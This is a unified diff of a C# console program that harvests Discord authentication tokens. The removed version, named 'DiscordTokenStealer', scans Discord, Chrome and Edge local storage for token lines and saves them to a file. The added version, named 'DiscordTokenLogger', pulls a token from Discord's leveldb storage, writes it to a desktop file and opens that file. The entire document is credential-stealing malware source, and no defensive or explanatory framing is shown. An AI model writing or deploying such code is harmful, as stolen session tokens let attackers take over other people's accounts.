@@ -1,67 +1,49 @@
+
 using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.IO;
+using System.Diagnostics;
+using System.Windows.Forms; 
 
-namespace DiscordTokenStealer
+namespace DiscordTokenLogger
 {
-    class Program
-    {
-        static void Main(string[] args)
-        {
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-            string discordPath = path + @"\discord\Local Storage\leveldb";
-            string chromePath = path + @"\Google\Chrome\User Data\Default\Local Storage";
-            string edgePath = path + @"\Microsoft\Edge\User Data\Default\Local Storage";
-            string[] discordTokens = new string[0];
-            string[] chromeTokens = new string[0];
-            string[] edgeTokens = new string[0];
-            string[] discordFiles = Directory.GetFiles(discordPath);
-            string[] chromeFiles = Directory.GetFiles(chromePath);
-            string[] edgeFiles = Directory.GetFiles(edgePath);
-            foreach (string file in discordFiles)
-            {
-                string[] lines = File.ReadAllLines(file);
-                foreach (string line in lines)
-                {
-                    if (line.Contains("oken"))
-                    {
-                        Array.Resize(ref discordTokens, discordTokens.Length + 1);
-                        discordTokens[discordTokens.Length - 1] = line;
-                    }
-                }
-            }
-            foreach (string file in chromeFiles)
-            {
-                string[] lines = File.ReadAllLines(file);
-                foreach (string line in lines)
-                {
-                    if (line.Contains("oken"))
-                    {
-                        Array.Resize(ref chromeTokens, chromeTokens.Length + 1);
-                        chromeTokens[chromeTokens.Length - 1] = line;
-                    }
-                }
-            }
-            foreach (string file in edgeFiles)
-            {
-                string[] lines = File.ReadAllLines(file);
-                foreach (string line in lines)
-                {
-                    if (line.Contains("oken"))
-                    {
-                        Array.Resize(ref edgeTokens, edgeTokens.Length + 1);
-                        edgeTokens[edgeTokens.Length - 1] = line;
-                    }
-                }
-            }
-            string[] tokens = new string[discordTokens.Length + chromeTokens.Length + edgeTokens.Length];
-            discordTokens.CopyTo(tokens, 0);
-            chromeTokens.CopyTo(tokens, discordTokens.Length);
-            edgeTokens.CopyTo(tokens, discordTokens.Length + chromeTokens.Length);
-            File.WriteAllLines(path + @"\discordTokens.txt", tokens);
-        }
-    }
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb";
+            string[] files = Directory.GetFiles(path);
+            string token = "";
+            foreach (string file in files)
+            {
+                if (file.Contains("https_discordapp.com_0.localstorage"))
+                {
+                    string[] lines = File.ReadAllLines(file);
+                    foreach (string line in lines)
+                    {
+                        if (line.Contains("token"))
+                        {
+                            token = line.Substring(line.IndexOf("token") + 7);
+                            token = token.Substring(0, token.IndexOf("\""));
+                            break;
+                        }
+                    }
+                }
+            }
+            if (token != "")
+            {
+                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                string fileName = desktop + "\\DiscordToken.txt";
+                File.WriteAllText(fileName, token);
+                Process.Start(fileName);
+            }
+            else
+            {
+                MessageBox.Show("No token found.");
+            }
+        }
+    }
 }
